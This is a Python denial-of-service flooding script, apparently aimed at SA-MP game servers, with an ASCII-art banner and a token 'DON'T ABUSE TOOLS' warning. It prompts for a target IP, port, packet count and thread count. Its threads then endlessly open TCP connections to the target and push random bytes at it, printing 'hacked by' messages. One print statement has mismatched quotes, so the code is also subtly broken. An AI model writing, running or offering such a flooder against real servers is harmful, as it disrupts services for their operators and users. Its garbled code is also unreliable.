import socket
import random
import threading

print("""
─────────────────────────────────────────────────────────────────────────────────────────────────────
─██████████████████──██████████████─██████──────────██████─██████████████───██████████─██████████████
─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██──██▒▒▒▒▒▒▒▒▒▒██─██▒▒██████████████▒▒██─██▒▒▒▒▒▒▒▒▒▒██───██▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██
─████████████▒▒▒▒██──██▒▒██████▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─██▒▒██████▒▒██───████▒▒████─██▒▒██████████
─────────████▒▒████──██▒▒██──██▒▒██─██▒▒██████▒▒██████▒▒██─██▒▒██──██▒▒██─────██▒▒██───██▒▒██────────
───────████▒▒████────██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██─██▒▒██████▒▒████───██▒▒██───██▒▒██████████
─────████▒▒████──────██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒██───██▒▒██───██▒▒▒▒▒▒▒▒▒▒██
───████▒▒████────────██▒▒██──██▒▒██─██▒▒██──██████──██▒▒██─██▒▒████████▒▒██───██▒▒██───██▒▒██████████
─████▒▒████──────────██▒▒██──██▒▒██─██▒▒██──────────██▒▒██─██▒▒██────██▒▒██───██▒▒██───██▒▒██────────
─██▒▒▒▒████████████──██▒▒██████▒▒██─██▒▒██──────────██▒▒██─██▒▒████████▒▒██─████▒▒████─██▒▒██████████
─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██──██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──────────██▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██
─██████████████████──██████████████─██████──────────██████─████████████████─██████████─██████████████
─────────────────────────────────────────────────────────────────────────────────────────────────────
Code By LEXSH1N:SAMP
""")
print("DON'T ABUSE TOOLS")
ip = str(input('[+] ip in server: '))
port = int(input('[+] Port in server: '))
pack = int(input('[+] Paket for send: '))
thread = int(input('[+] TimeOut: '))


def start():
    hh = random._urandom(10)
    xx = int(0)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(hh)
            for i in range(pack):
                s.send(hh)
            xx += 1
            print('hacked by wibuXyz+bernyanyi+' | Sent: '+str(xx))
        except:    
            s.close()
            print('Done')
for x in range(thread):
    thred = threading.Thread(target=start)
    thred.start()


# DONE!
